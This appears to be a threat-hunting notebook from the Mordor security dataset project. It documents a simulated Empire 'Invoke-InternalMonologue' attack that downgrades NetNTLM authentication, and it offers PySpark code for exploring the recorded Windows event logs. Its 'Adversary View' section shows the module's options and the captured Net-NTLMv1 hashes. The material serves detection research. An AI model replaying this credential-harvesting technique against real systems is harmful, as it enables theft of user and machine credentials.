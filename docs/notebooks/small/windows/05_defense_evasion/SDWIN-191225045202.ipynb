{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke InternalMonologue"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/12/25 |\n",
    "| Modification Date | 2020/09/21 |\n",
    "| Tactics           | ['[TA0005](https://attack.mitre.org/tactics/TA0005)'] |\n",
    "| Techniques        | ['[T1112](https://attack.mitre.org/techniques/T1112)'] |\n",
    "| Tags              | ['Registry Modification', 'Windows Registry NetNTLM settings', 'Downgrade'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries downgrading the challenge/response authentication protocol used for network logons, the minimum security negotiated for applications using NTLMSSP, and security settings that restrict outgoing NTLM traffic to remote servers in an environment"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|\n",
    "| Threat Hunter Playbook | Extended NetNTLM Downgrade | [https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-191224222300.html](https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-191224222300.html) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [invoke_internal_monologue](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-InternalMonologue.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: XFLEZM9N) > usemodule credentials/invoke_internal_monologue*\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > info\n",
    "\n",
    "            Name: Invoke-InternalMonologue\n",
    "            Module: powershell/credentials/invoke_internal_monologue\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "        Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "@eladshamir\n",
    "@4lex\n",
    "\n",
    "Description:\n",
    "Uses the Internal Monologue attack to force easily-\n",
    "decryptable Net-NTLMv1 responses over localhost and without\n",
    "directly touching LSASS.\n",
    "https://github.com/eladshamir/Internal-Monologue\n",
    "\n",
    "Comments:\n",
    "The underlying powershell function accepts switches that\n",
    "[DISABLE] default behaviours. The default settings will\n",
    "downgrade NetNTLM responses to v1, impersonate all users,\n",
    "use challenge 1122334455667788 and restore the registry to\n",
    "its original state. Set the options in this module to True\n",
    "in order to DISABLE the behaviours Disabling Downgrade and\n",
    "Impersonation yields higher OPSEC, but less than ideal loot\n",
    "\n",
    "Options:\n",
    "\n",
    "Name        Required    Value                     Description\n",
    "----        --------    -------                   -----------\n",
    "Agent       True        XFLEZM9N                  Agent to use for InternalMonologue      \n",
    "Challenge   True        1122334455667788          Net-NTLM Challenge to send              \n",
    "Downgrade   False                                 DISABLE downgrading to allow Net-NTLMv1 \n",
    "                                                    responses                               \n",
    "Impersonate False                                 DISABLE user impersonation and fetch    \n",
    "                                                    only current user                       \n",
    "Restore     False                                 DISABLE restoring the registry setting  \n",
    "                                                    that allowed v1 responses               \n",
    "Verbose     False                                 Verbose                                 \n",
    "\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked XFLEZM9N to run TASK_CMD_WAIT\n",
    "[*] Agent XFLEZM9N tasked with task ID 2\n",
    "[*] Tasked agent XFLEZM9N to run module powershell/credentials/invoke_internal_monologue\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > pgustavo::shire:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:1122334455667788\n",
    "IT001$::shire:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:1122334455667788\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/empire_monologue_netntlm_downgrade.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
